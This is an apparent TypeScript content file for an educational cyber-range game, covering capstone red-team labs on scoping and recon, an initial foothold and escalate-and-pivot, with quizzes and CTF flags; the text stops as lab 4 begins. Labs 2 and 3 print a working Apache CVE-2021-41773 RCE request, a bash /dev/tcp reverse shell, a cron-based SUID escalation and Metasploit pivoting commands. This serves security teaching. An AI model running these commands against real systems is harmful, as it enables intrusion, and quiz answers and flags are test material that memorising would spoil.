import type { EpochConfig, StageConfig } from "./types";

// ── Cyber Range: Full Engagement (Capstone) ──────────────────────────────────
// Ties the whole Range together into one authorized red-team engagement: scoping
// + recon, initial foothold, privilege escalation + pivot, and domain compromise
// + exfiltration + the professional report. Simulated faithful tooling; the close
// is the reporting/remediation discipline that makes it a profession, not a crime.
// Public sources (PTES, MITRE ATT&CK, OWASP).

export const rangeCapstoneEpoch: EpochConfig = {
  id: "range-capstone",
  name: "Full Engagement",
  subtitle: "A complete authorized red-team engagement, end to end",
  description:
    "Put it all together. One authorized engagement from rules-of-engagement and recon, through initial foothold and privilege escalation, to lateral movement, domain compromise, exfiltration — and the report that turns an attack into remediation. The capstone of the Cyber Range.",
  emoji: "🏴",
  color: "Red",
  unlocked: true,
};

const kali = { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" } as const;

export const rangeCapstoneStages: StageConfig[] = [
  // ─── Lab 1: scoping + recon ─────────────────────────────────────────────────
  {
    epochId: "range-capstone",
    wonder: { name: "The Engagement Letter", location: "Authorized Red-Team Engagement", era: "Present Day", emoji: "📋" },
    id: "cap-01",
    order: 1,
    title: "Scoping, Rules of Engagement & Recon",
    subtitle: "Authorization first — then map the target",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-cap-scope", name: "Engagement Lead", emoji: "📋" },
    challengeType: "ctf",
    info: {
      tagline: "What separates a penetration test from a crime is one document — written authorization — and a defined scope.",
      year: 2014,
      overview: [
        "A real engagement begins not with a scan but with paperwork, and that distinction is the whole profession. Authorized penetration testing requires a signed scope and rules of engagement (ROE): which systems are in scope and which are explicitly off-limits, the testing window, allowed techniques (is social engineering permitted? denial of service? is exfiltration of real data allowed or simulated?), emergency contacts, and a 'get out of jail' authorization letter. The same nmap scan that's professional reconnaissance inside an authorized scope is a felony outside it — the Computer Fraud and Abuse Act and equivalents worldwide make unauthorized access a crime regardless of intent. Methodologies like PTES and the OSSTMM formalize this; the first phase is always pre-engagement.",
        "With authorization in hand, the engagement opens with reconnaissance — exactly the discipline from the Recon epoch, now applied to a defined target. You map the external surface (nmap host discovery, port and service scanning, web content discovery), identify the technologies and versions, and build the picture that drives everything after. Good recon is the difference between a thorough test and a missed finding, and it's documented as you go: every host, service, and version is recorded, because the engagement ends in a report and the report is only as good as the evidence. This capstone runs a complete authorized engagement against the lab estate — scope, recon, foothold, escalation, pivot, and report — tying every tool in the Range into one operation.",
      ],
      technical: {
        title: "Pre-Engagement + External Recon",
        body: [
          "Pre-engagement (the legal + practical foundation):\n- Signed scope + rules of engagement (ROE): in-scope systems, off-limits systems, testing window.\n- Allowed techniques (social engineering? DoS? real vs simulated exfiltration?).\n- Authorization letter ('get out of jail'), emergency contacts, data-handling rules.\n- Methodology: PTES / OSSTMM / NIST 800-115 phases.",
          "External recon (Recon epoch, applied):\n- nmap -sn / -sS -p- / -sV — discover hosts, ports, services, versions.\n- Web content discovery (gobuster/ffuf) on any web app in scope.\n- Identify tech stack + versions → candidate vulnerabilities.\n- Document everything: hosts, services, versions, findings — the report's evidence base.",
          "The professional frame:\n- Stay in scope, always — touching an out-of-scope system is a breach of contract (and possibly the law).\n- Minimize impact; coordinate anything risky; keep clean logs of your own actions.\n- The deliverable is remediation, not bragging rights — recon feeds findings, findings feed fixes.",
        ],
        codeExample: {
          label: "In-scope recon kicks off the engagement",
          code: `# SCOPE (from the signed ROE):  in: 10.10.10.0/24   OUT: 10.10.99.0/24
# Window: this week, business hours.  Exfil: simulated (capture a flag, not real data)

$ nmap -sn 10.10.10.0/24                     # in-scope host discovery
  10.10.10.40 up (web)   10.10.10.41 up (windows)
$ nmap -sV -p- 10.10.10.40
  80/tcp  http  Apache 2.4.49   445/tcp  smb  Samba   3306/tcp mysql
$ gobuster dir -u http://10.10.10.40 -w common.txt
  /admin (401)  /backup/db.sql.bak (200)     # leads for the foothold

# Out of scope (10.10.99.0/24): DO NOT TOUCH.`,
        },
      },
      incident: {
        title: "Authorization Is the Line",
        when: "Continuous — the legal foundation of all offensive security work",
        where: "Every legitimate penetration test and red-team engagement",
        impact: "The same actions are a paid service or a federal crime depending on one signed document",
        body: [
          "The defining feature of professional offensive security is that authorization, not technique, separates it from criminal hacking. Security researchers have faced prosecution for testing systems without explicit permission, and the lesson is unambiguous: get the scope and the authorization letter signed before a single packet, stay rigorously inside scope, and treat the engagement letter as the most important tool in the kit. Bug-bounty programs encode the same idea in their safe-harbor terms.",
          "This frame matters for the whole Range: every technique you've learned is dual-use, and the only thing that makes its use legitimate is authorization plus a defensive purpose. The capstone is run as an authorized engagement precisely to model that discipline — and it ends, as real engagements do, with a report whose entire point is to help the defender fix what you found.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Signed ROE + scope", sub: "authorization first", type: "attacker" },
          { label: "In-scope recon", sub: "nmap + content discovery", type: "system" },
          { label: "Surface mapped", sub: "hosts, services, leads", type: "victim" },
          { label: "Engagement plan", sub: "→ foothold next", type: "result" },
        ],
      },
      timeline: [
        { year: 2014, event: "PTES / OSSTMM formalize engagement phases" },
        { year: 2016, event: "Bug-bounty safe-harbor terms normalize authorized testing", highlight: true },
        { year: 2022, event: "CFAA guidance clarifies good-faith security research" },
      ],
      keyTakeaways: [
        "Authorization (signed scope + ROE) — not technique — separates a pen test from a crime",
        "ROE defines in/out-of-scope systems, window, allowed techniques, and data handling",
        "Stay rigorously in scope; touching an out-of-scope system breaches contract and possibly law",
        "External recon (nmap, content discovery) maps the surface and feeds the findings",
        "Document everything as you go — the engagement ends in a report, and evidence is the report",
      ],
      references: [
        { title: "Penetration Testing Execution Standard (PTES)", url: "http://www.pentest-standard.org/" },
        { title: "NIST SP 800-115 — Technical Guide to Security Testing", url: "https://csrc.nist.gov/pubs/sp/800/115/final" },
      ],
    },
    quiz: {
      questions: [
        { id: "cap-01-q1", type: "Ethics", challenge: "The line.", text: "What separates a penetration test from a crime?", options: ["Written authorization and a defined scope", "A faster scanner", "Using Kali Linux", "Wearing a hoodie"], correctIndex: 0, explanation: "Authorization + scope is the legal foundation." },
        { id: "cap-01-q2", type: "ROE", challenge: "Rules.", text: "What do Rules of Engagement (ROE) define?", options: ["In/out-of-scope systems, window, allowed techniques, and data handling", "The exploit code", "The flag value", "The wordlist"], correctIndex: 0, explanation: "ROE set the boundaries and permitted actions." },
        { id: "cap-01-q3", type: "Scope", challenge: "Stay in bounds.", text: "What happens if you test an out-of-scope system?", options: ["You breach the contract and possibly the law", "You get bonus points", "Nothing", "It's encouraged"], correctIndex: 0, explanation: "Out-of-scope testing is unauthorized — a serious violation." },
        { id: "cap-01-q4", type: "Phase", challenge: "First phase.", text: "What is the first phase of a methodology like PTES?", options: ["Pre-engagement (scoping + authorization)", "Exploitation", "Reporting", "Persistence"], correctIndex: 0, explanation: "Pre-engagement comes before any technical work." },
        { id: "cap-01-q5", type: "Recon", challenge: "Open it.", text: "With authorization in hand, how does the engagement begin technically?", options: ["Reconnaissance — mapping hosts, services, and versions in scope", "Deleting logs", "Reporting", "Persistence"], correctIndex: 0, explanation: "Recon maps the surface and drives everything after." },
        { id: "cap-01-q6", type: "Law", challenge: "The statute.", text: "Unauthorized access is criminalized under which (US) law?", options: ["The Computer Fraud and Abuse Act (CFAA)", "GDPR only", "HIPAA only", "There's no law"], correctIndex: 0, explanation: "The CFAA (and equivalents worldwide) criminalize unauthorized access." },
        { id: "cap-01-q7", type: "Documentation", challenge: "Why record.", text: "Why document every host/service/version during recon?", options: ["The engagement ends in a report, and evidence is the report's basis", "To slow down", "It's optional fluff", "To brag"], correctIndex: 0, explanation: "Findings and remediation depend on documented evidence." },
        { id: "cap-01-q8", type: "Purpose", challenge: "The deliverable.", text: "What is the real deliverable of an engagement?", options: ["Remediation — helping the defender fix what was found", "A trophy screenshot", "Persistence", "A new exploit"], correctIndex: 0, explanation: "The point is improving the client's security, captured in the report." },
      ],
    },
    ctf: {
      attackerMachine: kali,
      targetMachine: { ip: "10.10.10.40", hostname: "corp-web", os: "Linux / Apache + MySQL", openPorts: "80, 445, 3306", vulnerability: "in-scope engagement target" },
      scenario: "You've been hired for an authorized red-team engagement. The signed scope is 10.10.10.0/24 (10.10.99.0/24 is OFF-LIMITS). Confirm scope, then run external recon to map the surface and find leads for a foothold.",
      hint: "Acknowledge the rules of engagement, then run in-scope recon to enumerate hosts, services, and web leads.",
      hints: [
        "Read the engagement briefing. Run: cat briefing.txt",
        "Confirm scope + rules of engagement. Run: roe-confirm",
        "Run in-scope external recon. Run: recon-scope 10.10.10.0/24",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{3NG4G3M3NT_", label: "Engagement Briefing" },
        { trigger: "roe-confirm", value: "SC0P3_", label: "Scope & ROE Confirmed" },
        { trigger: "recon-scope 10.10.10.0/24", value: "R3C0N}", label: "Surface Mapped" },
      ],
      files: {
        "/briefing.txt": [
          "AUTHORIZED RED-TEAM ENGAGEMENT — CAPSTONE",
          "Client: Corp Inc.  Scope: 10.10.10.0/24   OFF-LIMITS: 10.10.99.0/24",
          "Window: this week.  Exfil: SIMULATED (capture flags, not real data).",
          "Goal of lab 1: confirm scope, run recon, find footholds.",
          "Sequence: roe-confirm -> recon-scope 10.10.10.0/24 -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "roe-confirm": (_args: string[]) => ({
          lines: [
            "[Rules of Engagement] acknowledged:",
            "  IN SCOPE:    10.10.10.0/24",
            "  OUT OF SCOPE: 10.10.99.0/24   (DO NOT TOUCH)",
            "  Allowed: network/web exploitation, simulated exfil.  No real-data theft, no DoS.",
            "  Authorization letter: on file. Emergency contact: set.",
            "",
            ">> LEARN: authorization + scope is what makes this legal, not the tools",
            "   The same scan out of scope is a crime. Fragment collected.",
          ],
        }),
        "recon-scope": (args: string[]) => {
          if (args[0] !== "10.10.10.0/24") return { lines: ["Usage: recon-scope 10.10.10.0/24  (in-scope only!)"] };
          return {
            lines: [
              "$ nmap -sn 10.10.10.0/24   ->  10.10.10.40 (web), 10.10.10.41 (windows) up",
              "$ nmap -sV -p- 10.10.10.40",
              "  80/tcp http Apache 2.4.49   445/tcp smb Samba   3306/tcp mysql",
              "$ gobuster dir -u http://10.10.10.40 ...",
              "  /admin (401)   /backup/db.sql.bak (200)   <-- foothold leads",
              "  (10.10.99.x left untouched — out of scope)",
              "",
              ">> LEARN: recon drives the whole engagement + documents the evidence",
              "   Apache 2.4.49 + an exposed backup = your way in (next lab).",
              "   Run 'assemble' to view the flag and the submit command.",
            ],
          };
        },
      },
    },
  },

  // ─── Lab 2: initial foothold ────────────────────────────────────────────────
  {
    epochId: "range-capstone",
    wonder: { name: "The First Shell", location: "Authorized Red-Team Engagement", era: "Present Day", emoji: "🐚" },
    id: "cap-02",
    order: 2,
    title: "Initial Foothold",
    subtitle: "Turn a recon lead into a shell",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-cap-foothold", name: "Foothold", emoji: "🐚" },
    challengeType: "ctf",
    info: {
      tagline: "Recon found the door; exploitation opens it — convert a vulnerability into your first shell on the target.",
      year: 2021,
      overview: [
        "The foothold phase converts a recon lead into code execution. From the capstone recon, two leads stood out: Apache 2.4.49 (CVE-2021-41773 path traversal that escalates to RCE) and an exposed database backup at /backup/db.sql.bak that leaks credentials. Either is a path in — this is where the Web Exploitation epoch's techniques meet the Metasploit epoch's workflow. A skilled operator picks the highest-probability, lowest-impact route: exploiting a versioned CVE with a vetted exploit, or simply logging in with leaked credentials, both land the same thing — an initial shell, typically running as the web user (www-data).",
        "The discipline here is to gain access reliably and quietly, and to document it. You confirm the vulnerability, get a stable shell (upgrade a web shell to an interactive reverse shell, stabilize the TTY), and immediately establish situational awareness: who am I (id/whoami), what host is this, what's nearby. A foothold as www-data is rarely the goal — it's the platform from which you'll escalate (next lab) and pivot. Throughout, you keep evidence for the report: the exact request that worked, the response proving execution, and the time. The engagement is a chain, and the foothold is the first link that makes the rest possible.",
      ],
      technical: {
        title: "Gaining the Initial Shell",
        body: [
          "Picking the route (from the recon leads):\n- Apache 2.4.49 → CVE-2021-41773 path traversal → RCE (a versioned, vetted exploit).\n- /backup/db.sql.bak → leaked DB/app credentials → log in directly (low impact).\n- Choose reliability + low impact; confirm before firing; keep it in scope.",
          "Landing + stabilizing the shell:\n- Get execution → spawn a reverse shell back to your listener (nc / msfvenom / a one-liner).\n- Stabilize the TTY (python3 -c 'pty.spawn(\"/bin/bash\")', stty raw) for a usable shell.\n- Situational awareness: id, hostname, ip a, sudo -l, ps — orient before acting.",
          "Evidence + hygiene (it ends in a report):\n- Record the exact request/exploit, the proof of execution, and the timestamp.\n- Avoid destructive actions; minimize footprint; you're a guest with permission.\n- This www-data foothold is the launch pad for escalation + pivoting, not the finish.",
        ],
        codeExample: {
          label: "Recon lead → reverse shell as www-data",
          code: `# Route A: exploit the versioned CVE (Apache 2.4.49 path traversal -> RCE)
$ curl 'http://10.10.10.40/cgi-bin/.%2e/.%2e/bin/sh' --data 'echo;id'
  uid=33(www-data)                       # RCE confirmed

# Land a stable reverse shell to your listener
$ ... payload: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
attacker$ nc -lvnp 4444
www-data@corp-web:/$ id  ->  uid=33(www-data)

# Stabilize the TTY
www-data$ python3 -c 'import pty;pty.spawn("/bin/bash")'

# Route B (alternative): creds from /backup/db.sql.bak -> direct login`,
        },
      },
      incident: {
        title: "Apache 2.4.49 — A Versioned CVE Becomes a Foothold",
        when: "2021 (CVE-2021-41773) — exploited within days of disclosure",
        where: "Internet-facing Apache 2.4.49 servers",
        impact: "A version string in a banner became mass remote code execution",
        body: [
          "CVE-2021-41773 turned the exact recon lesson into a foothold: Apache 2.4.49's path-traversal flaw was trivially escalated to RCE and exploited en masse within days, precisely against the servers whose version banners advertised them. It's the clean illustration of why version enumeration matters — recon found the version, and the version was the way in.",
          "Defensively, the foothold phase is what patching, version-hiding, and least-privilege web users are meant to prevent or contain. A patched Apache has no foothold; a www-data account with no path to root contains the damage even if a shell lands. The engagement narrative makes the case concretely: close the recon-to-foothold gap, and the rest of the chain never starts.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Recon lead", sub: "Apache 2.4.49 / leaked creds", type: "attacker" },
          { label: "Exploit / login", sub: "CVE-2021-41773 or creds", type: "system" },
          { label: "Reverse shell", sub: "stabilized TTY", type: "victim" },
          { label: "Foothold (www-data)", sub: "→ escalate + pivot next", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "EternalBlue shows service exploitation as a foothold" },
        { year: 2021, event: "Apache 2.4.49 (CVE-2021-41773) — version to RCE foothold", highlight: true },
        { year: 2023, event: "Exposed backups/credentials remain a top foothold cause" },
      ],
      keyTakeaways: [
        "The foothold phase converts a recon lead into code execution (a shell)",
        "Pick the reliable, low-impact route: a versioned CVE exploit or leaked credentials",
        "Land a stable reverse shell and stabilize the TTY; then get situational awareness",
        "A www-data foothold is the launch pad for escalation and pivoting, not the goal",
        "Patching + version-hiding + least-privilege web users close the recon-to-foothold gap",
      ],
      references: [
        { title: "CVE-2021-41773 — Apache Path Traversal", url: "https://httpd.apache.org/security/vulnerabilities_24.html" },
        { title: "OWASP Web Security Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      ],
    },
    quiz: {
      questions: [
        { id: "cap-02-q1", type: "Phase", challenge: "What it does.", text: "What does the foothold phase accomplish?", options: ["Converts a recon lead into code execution (a shell)", "Writes the report", "Scopes the engagement", "Cracks all passwords"], correctIndex: 0, explanation: "Foothold = initial code execution on the target." },
        { id: "cap-02-q2", type: "Route", challenge: "Pick wisely.", text: "How should an operator choose a foothold route?", options: ["Highest reliability + lowest impact, in scope (e.g. a versioned CVE or leaked creds)", "The loudest possible", "Always DoS first", "Randomly"], correctIndex: 0, explanation: "Reliability and low impact matter in a professional engagement." },
        { id: "cap-02-q3", type: "CVE", challenge: "The lead.", text: "Why is Apache 2.4.49 a clean foothold lead?", options: ["CVE-2021-41773 path traversal escalates to RCE on that version", "It's the newest", "It can't be exploited", "It's a database"], correctIndex: 0, explanation: "The version maps directly to an RCE CVE." },
        { id: "cap-02-q4", type: "Shell", challenge: "Stabilize.", text: "Why stabilize the TTY after landing a shell?", options: ["To get a usable, interactive shell (job control, editors, etc.)", "To delete logs", "To encrypt traffic", "To scan ports"], correctIndex: 0, explanation: "A stabilized TTY makes the shell practical to work in." },
        { id: "cap-02-q5", type: "Awareness", challenge: "Orient.", text: "What's the first thing to do on a fresh shell?", options: ["Situational awareness: id, hostname, sudo -l, what's nearby", "Reboot", "Exfil everything", "Nothing"], correctIndex: 0, explanation: "Orient before acting — know who/where you are." },
        { id: "cap-02-q6", type: "Privilege", challenge: "Who you are.", text: "A web exploit foothold typically runs as which user?", options: ["The web server user (www-data) — then you escalate", "root immediately", "Domain admin", "Guest with nothing"], correctIndex: 0, explanation: "Web footholds start low-priv; escalation comes next." },
        { id: "cap-02-q7", type: "Evidence", challenge: "Record it.", text: "What should you record about the foothold?", options: ["The exact request/exploit, proof of execution, and the timestamp", "Nothing", "Only the flag", "The wallpaper"], correctIndex: 0, explanation: "Evidence supports the report and remediation." },
        { id: "cap-02-q8", type: "Defense", challenge: "Prevent it.", text: "What closes the recon-to-foothold gap?", options: ["Patching, version-hiding, and least-privilege web users", "Bigger servers", "More open ports", "Disabling logging"], correctIndex: 0, explanation: "Patched, hardened services deny the foothold or contain it." },
      ],
    },
    ctf: {
      attackerMachine: kali,
      targetMachine: { ip: "10.10.10.40", hostname: "corp-web", os: "Linux / Apache 2.4.49", openPorts: "80, 445, 3306", vulnerability: "CVE-2021-41773 (Apache path traversal → RCE) + exposed backup" },
      pivotTrigger: "get-shell",
      scenario: "Recon flagged Apache 2.4.49 (CVE-2021-41773) and an exposed DB backup on corp-web (10.10.10.40). Exploit the CVE to get remote code execution, then land a stable reverse shell as www-data.",
      hint: "Confirm the path-traversal RCE, then catch a reverse shell on your listener.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Exploit the Apache CVE for code execution. Run: exploit-apache 10.10.10.40",
        "Land + stabilize a reverse shell (pivots you onto the box). Run: get-shell",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{F00TH0LD_", label: "Foothold Briefing" },
        { trigger: "exploit-apache 10.10.10.40", value: "W3BSH3LL_", label: "RCE Achieved" },
        { trigger: "get-shell", value: "G41N3D}", label: "Reverse Shell as www-data" },
      ],
      files: {
        "/briefing.txt": [
          "ENGAGEMENT — LAB 2: INITIAL FOOTHOLD",
          "Target corp-web 10.10.10.40 (Apache 2.4.49 / CVE-2021-41773).",
          "Goal: RCE -> stable reverse shell as www-data.",
          "Sequence: exploit-apache 10.10.10.40 -> get-shell -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "exploit-apache": (args: string[]) => {
          if (args[0] !== "10.10.10.40") return { lines: ["Usage: exploit-apache 10.10.10.40"] };
          return {
            lines: [
              "$ curl 'http://10.10.10.40/cgi-bin/.%2e/.%2e/.%2e/bin/sh' --data 'echo;id'",
              "  uid=33(www-data) gid=33(www-data)        <-- RCE confirmed (CVE-2021-41773)",
              "  echo;cat /etc/passwd -> readable",
              "",
              ">> LEARN: the versioned CVE recon found = your foothold",
              "   Path traversal escalated to command execution. Fragment collected.",
            ],
          };
        },
        "get-shell": (_args: string[]) => ({
          lines: [
            "$ payload: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
            "attacker$ nc -lvnp 4444",
            "  connect from 10.10.10.40 ...",
            "www-data@corp-web:/$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "www-data@corp-web:/$ id  ->  uid=33(www-data)",
            "",
            ">> LEARN: a stable shell as www-data is the launch pad — not the goal",
            ">> BLUE TEAM: patch Apache; least-privilege web user contains the foothold.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 3: escalate + pivot ────────────────────────────────────────────────
  {
    epochId: "range-capstone",
    wonder: { name: "The Internal Network", location: "Authorized Red-Team Engagement", era: "Present Day", emoji: "🔀" },
    id: "cap-03",
    order: 3,
    title: "Escalate & Pivot",
    subtitle: "Become root, then reach the network you couldn't see",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "badge-cap-pivot", name: "Pivot", emoji: "🔀" },
    challengeType: "ctf",
    info: {
      tagline: "From a foothold, two moves win the network: escalate to root on this box, then pivot through it to the internal segment.",
      year: 2016,
      overview: [
        "With a www-data foothold, the engagement advances on two axes that you already practiced. First, privilege escalation: enumerate the box (LinPEAS), find the misconfiguration — a writable root cron, an abusable SUID binary, stored credentials — and become root, gaining full control of this host and any secrets on it. Root on the web server is valuable not just for what's here, but for what it unlocks: this dual-homed machine sits on the external network you scanned and on an internal segment (10.10.20.0/24) you could never reach from outside.",
        "Second, pivoting: use the compromised host as a relay to attack that internal network. By adding a route through your session (Metasploit's autoroute) and standing up a SOCKS proxy (then proxychains your tools through it), you can scan and exploit internal-only hosts — a database server, a file share, and ultimately the domain controller — as if you were inside. This is the lateral-movement engine behind every significant breach: the perimeter is one barrier, but a single pivot turns it into a doorway. The engagement now reaches the internal estate, setting up the final move (domain compromise) — and every step maps to a defensive control: segmentation to stop the pivot, host hardening to deny the escalation, and monitoring to catch both.",
      ],
      technical: {
        title: "Escalation + Pivoting",
        body: [
          "Escalate (PrivEsc epoch, applied):\n- LinPEAS → find the win (writable root cron / SUID / stored creds).\n- Exploit it → root on corp-web; loot local credentials and config.",
          "Pivot (reach the internal segment):\n- Discover the second interface: ip a → 10.10.20.0/24 (internal-only).\n- Route through the session: meterpreter run autoroute -s 10.10.20.0/24.\n- SOCKS proxy + proxychains: tunnel nmap/exploits through the foothold.\n- Now scan/attack internal hosts (db, fileshare, DC) as if local.",
          "The defensive mirror (this is where segmentation earns its keep):\n- Network segmentation + east-west firewalling stops the pivot reaching the DC.\n- Host hardening (the PrivEsc fixes) denies the local escalation.\n- Monitoring: anomalous internal scanning from a web server, new routes, unusual SMB — all detectable.",
        ],
        codeExample: {
          label: "Root, then pivot to the internal network",
          code: `# Escalate (LinPEAS found a writable root cron)
www-data$ echo 'cp /bin/bash /tmp/r;chmod +s /tmp/r' >> /opt/scripts/backup.sh
www-data$ /tmp/r -p   ->  root

# Discover the internal interface
root# ip a
  eth0 10.10.10.40 (external)   eth1 10.10.20.5 (INTERNAL — new!)

# Pivot: route + proxy through this host
meterpreter > run autoroute -s 10.10.20.0/24
meterpreter > use auxiliary/server/socks_proxy   # + proxychains
$ proxychains nmap -sT 10.10.20.10   # the internal DC, now reachable

# THE FIX: segment the network so a web box can't route to the DC`,
        },
      },
      incident: {
        title: "The Pivot — Why Flat Networks Fall Whole",
        when: "Every major breach with lateral movement",
        where: "Enterprises whose internal networks are flat (no segmentation)",
        impact: "One foothold + a pivot repeatedly becomes total internal compromise",
        body: [
          "Lateral movement through a pivot is the recurring pattern in catastrophic breaches: attackers rarely exploit the crown jewel directly — they land on a low-value, internet-adjacent host, escalate, and pivot inward across a flat network until they reach the domain controller. Target's breach pivoted from an HVAC vendor's access; countless ransomware events pivot from a single phished workstation to domain-wide deployment.",
          "This is exactly why network segmentation is among the highest-value defensive controls: it doesn't prevent the foothold, but it prevents the foothold from becoming the network. East-west firewalling, separating the web DMZ from internal servers, and denying a web host any route to the domain controller turn one compromised box into a contained incident. The pivot is powerful precisely because most networks are flat — and segmentation is the answer.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Foothold (www-data)", sub: "LinPEAS → root", type: "attacker" },
          { label: "Dual-homed host", sub: "eth0 external / eth1 internal", type: "system" },
          { label: "autoroute + proxy", sub: "pivot to 10.10.20.0/24", type: "victim" },
          { label: "Internal network", sub: "→ fix: segmentation", type: "result" },
        ],
      },
      timeline: [
        { year: 2013, event: "Target breach — pivot from vendor access to PoS network" },
        { year: 2016, event: "Pivoting standardizes in red-team + ransomware tradecraft", highlight: true },
        { year: 2021, event: "Flat-network lateral movement drives mass ransomware impact" },
      ],
      keyTakeaways: [
        "From a foothold: escalate to root locally, then pivot to the internal network",
        "Root on a dual-homed host unlocks an internal segment unreachable from outside",
        "Pivoting = route through the session (autoroute) + a SOCKS proxy (proxychains) to attack internal hosts",
        "The pivot is the lateral-movement engine behind most major breaches",
        "Network segmentation is the high-value fix: it stops the foothold from becoming the whole network",
      ],
      references: [
        { title: "MITRE ATT&CK — Lateral Movement (TA0008)", url: "https://attack.mitre.org/tactics/TA0008/" },
        { title: "NIST — Network Segmentation guidance", url: "https://csrc.nist.gov/glossary/term/network_segmentation" },
      ],
    },
    quiz: {
      questions: [
        { id: "cap-03-q1", type: "Two Moves", challenge: "From a foothold.", text: "What two moves advance the engagement from a www-data foothold?", options: ["Escalate to root locally, then pivot to the internal network", "Reboot, then scan", "Report, then exit", "DoS, then phish"], correctIndex: 0, explanation: "Escalation + pivoting open the internal estate." },
        { id: "cap-03-q2", type: "Escalate", challenge: "Find the win.", text: "How do you escalate on the foothold box?", options: ["Enumerate (LinPEAS) and exploit a misconfiguration (writable cron/SUID/creds)", "Brute-force SSH again", "Disable the firewall", "Nothing"], correctIndex: 0, explanation: "Local enumeration finds the escalation path." },
        { id: "cap-03-q3", type: "Pivot", challenge: "What it is.", text: "What is pivoting?", options: ["Using a compromised host as a relay to reach networks you couldn't otherwise", "Cracking a hash", "A type of XSS", "A scan only"], correctIndex: 0, explanation: "The compromised host routes your traffic deeper." },
        { id: "cap-03-q4", type: "Tooling", challenge: "Route through.", text: "Which Metasploit feature routes traffic through a session into a subnet?", options: ["autoroute (+ a SOCKS proxy / proxychains)", "hashdump", "search", "msfvenom"], correctIndex: 0, explanation: "autoroute + SOCKS lets tools reach internal hosts via the pivot." },
        { id: "cap-03-q5", type: "Dual-homed", challenge: "Why this host.", text: "Why is a dual-homed foothold so valuable?", options: ["It bridges the external network and an internal-only segment", "It has more RAM", "It runs faster", "It has no users"], correctIndex: 0, explanation: "Two interfaces let you reach an otherwise-unreachable network." },
        { id: "cap-03-q6", type: "Pattern", challenge: "Breaches.", text: "Why do flat networks 'fall whole'?", options: ["One foothold + a pivot reaches everything, including the DC", "They're encrypted", "They have MFA", "They're segmented"], correctIndex: 0, explanation: "No internal barriers means lateral movement is unimpeded." },
        { id: "cap-03-q7", type: "Defense", challenge: "Top control.", text: "Which defensive control most directly stops the pivot?", options: ["Network segmentation / east-west firewalling", "A longer password", "Disabling logging", "Opening more ports"], correctIndex: 0, explanation: "Segmentation prevents a foothold from reaching the whole network." },
        { id: "cap-03-q8", type: "Detection", challenge: "Catch it.", text: "What's a detectable sign of pivoting?", options: ["A web server suddenly scanning internal hosts / anomalous internal SMB", "A login at 9am", "A normal web request", "High disk usage"], correctIndex: 0, explanation: "Internal scanning from a DMZ host is a strong anomaly." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.10.40", hostname: "corp-web", os: "Linux (www-data → root)" },
      targetMachine: { ip: "10.10.20.10", hostname: "corp-dc (internal)", os: "Windows Server (Domain Controller)", openPorts: "internal-only", vulnerability: "reachable only via pivot through corp-web" },
      scenario: "You hold a www-data shell on corp-web (10.10.10.40). Escalate to root, discover the internal interface, and pivot so the internal segment 10.10.20.0/24 — including the domain controller — becomes reachable.",
      hint: "Escalate via the LinPEAS finding, then add a route + proxy through the foothold to scan the internal network.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Escalate to root on the foothold. Run: escalate-root",
        "Pivot into the internal segment. Run: pivot-internal 10.10.20.0/24",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{R00T_", label: "Escalate & Pivot Briefing" },
        { trigger: "escalate-root", value: "P1V0T_", label: "Root on the Foothold" },
        { trigger: "pivot-internal 10.10.20.0/24", value: "1NT3RN4L}", label: "Internal Network Reached" },
      ],
      files: {
        "/briefing.txt": [
          "ENGAGEMENT — LAB 3: ESCALATE & PIVOT",
          "Foothold: www-data @ corp-web 10.10.10.40 (dual-homed).",
          "Goal: root, then pivot to internal 10.10.20.0/24 (DC at .10).",
          "Sequence: escalate-root -> pivot-internal 10.10.20.0/24 -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "escalate-root": (_args: string[]) => ({
          lines: [
            "www-data$ ./linpeas.sh -> world-writable root cron /opt/scripts/backup.sh",
            "www-data$ echo 'cp /bin/bash /tmp/r;chmod +s /tmp/r' >> /opt/scripts/backup.sh",
            "www-data$ /tmp/r -p  ->  # id => euid=0(root)",
            "root# ip a  ->  eth0 10.10.10.40 (ext)   eth1 10.10.20.5 (INTERNAL!)",
            "",
            ">> LEARN: root unlocked a second interface — an internal-only segment",
            "   This box bridges the DMZ and the internal network. Fragment collected.",
          ],
        }),
        "pivot-internal": (args: string[]) => {
          if (args[0] !== "10.10.20.0/24") return { lines: ["Usage: pivot-internal 10.10.20.0/24"] };
          return {
            lines: [
              "meterpreter > run autoroute -s 10.10.20.0/24",
              "meterpreter > use auxiliary/server/socks_proxy   (+ proxychains)",
              "$ proxychains nmap -sT 10.10.20.10",
              "  10.10.20.10  corp-dc  445/tcp open (Windows Server — Domain Controller)",
              "  10.10.20.20  corp-fs  (file share)",
              "",
              ">> LEARN: the foothold relays your traffic into the internal network",
              ">> BLUE TEAM: segmentation would stop a web box from ever routing to the DC.",
              "   Run 'assemble' to view the flag and the submit command.",
            ],
          };
        },
      },
    },
  },

  // ─── Lab 4: domain compromise + report ──────────────────────────────────────
  {
    epochId: "range-capstone",
